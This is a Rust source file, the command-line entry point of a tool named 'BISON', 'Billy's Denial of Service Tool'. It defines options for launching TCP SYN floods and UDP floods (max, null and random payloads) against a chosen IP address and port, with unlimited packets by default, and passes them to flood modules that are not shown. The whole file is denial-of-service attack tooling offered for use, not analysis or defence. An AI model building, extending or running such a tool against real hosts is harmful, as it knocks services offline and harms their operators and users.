mod udp;
mod tcp;

use clap::{App, Arg, SubCommand, crate_authors};

fn main(){	
    let args = App::new("BISON")
                            .version("1.0")
                            .author(crate_authors!())
                            .about("Billy's Denial of Service Tool")
                            .subcommand(
                                SubCommand::with_name("tcp")
                                .about("TCP protocol based attacks")
                                .arg(
                                    Arg::with_name("syn")
                                        .short("s")
                                        .long("syn")
                                        .help("Run a syn flood attack (requires ip address and interface to be set)")
                                        .requires_all(&["ip address", "interface"])
                                        .required(true)

                                )
                                .arg(
                                    Arg::with_name("ip address")
                                        .short("t")
                                        .long("target")
                                        .help("Specify the IP address you want to attack")
                                        .takes_value(true)
                                )
                                .arg(
                                    Arg::with_name("interface")
                                        .short("i")
                                        .long("interface")
                                        .help("Network interface to send packets from (run ifconfig to find this)")
                                        .takes_value(true)
                                )
                                .arg(
                                    Arg::with_name("number of packets")
                                        .short("n")
                                        .long("num_pack")
                                        .help("The number of packets you want to send (0 for infinite)")
                                        .default_value("0")
                                        .takes_value(true)
                                ))

                            .subcommand(
                                SubCommand::with_name("udp")
                                .about("UDP protocol based attacks")
                                .arg(
                                    Arg::with_name("flood")
                                        .short("flood")
                                        .long("flood")
                                        .help("Run a UDP packet flood attack (requires ip address and type of attack to be set)")
                                        .requires_all(&["ip:port", "attack type"])
                                        .required(true)

                                )
                                .arg(
                                    Arg::with_name("ip:port")
                                        .short("t")
                                        .long("target")
                                        .help("Specify the IP address and port you want to attack")
                                        .takes_value(true)
                                )
                                .arg(
                                    Arg::with_name("attack type")
                                        .short("a")
                                        .long("attack_type")
                                        .help("The type of UDP packet flood to send")
                                        .possible_values(&["max", "null", "rnd"])
                                        .takes_value(true)
                                )
                                .arg(
                                    Arg::with_name("packet size")
                                        .short("s")
                                        .long("packet_size")
                                        .help("The size of UDP packet to send (max. value is 65507)")
                                        // https://stackoverflow.com/questions/1098897/what-is-the-largest-safe-udp-packet-size-on-the-internet
                                        .default_value("500")
                                        .takes_value(true)
                                )
                                
                            
                            )

                            .get_matches();

    if let Some(args) = args.subcommand_matches("tcp"){
        //All TCP attacks need the IP address field
        let ip = args.value_of("ip address").unwrap();
        
        println!("Running a TCP based attack!");
        
        if args.is_present("syn"){
            // The nice thing about clap is that it's safe to unwrap these arguments, since they're required
            let num_of_packets = args.value_of("number of packets").unwrap();
            let interface = args.value_of("interface").unwrap();

            println!("Running a SYN flood attack!");

            tcp::flood::syn(ip.parse().unwrap(), interface.parse().unwrap(), num_of_packets.parse().unwrap())
        }
    } else if let Some(args) = args.subcommand_matches("udp") {
        //All UDP attacks also need the IP address field
        let ip = args.value_of("ip:port").unwrap();

        println!("Running a UDP based attack!");

        if args.is_present("flood") {
            let attack_type =  args.value_of("attack type").unwrap();
            let packet_size = args.value_of("packet size").unwrap();

            if attack_type == "max" {
                udp::flood::max(ip, packet_size.parse().unwrap())
            } else if attack_type == "rnd" {
                udp::flood::rnd(ip, packet_size.parse().unwrap())
            }  else if attack_type == "null" {
                udp::flood::null(ip)
            }
        }
    }
    
    
    
}
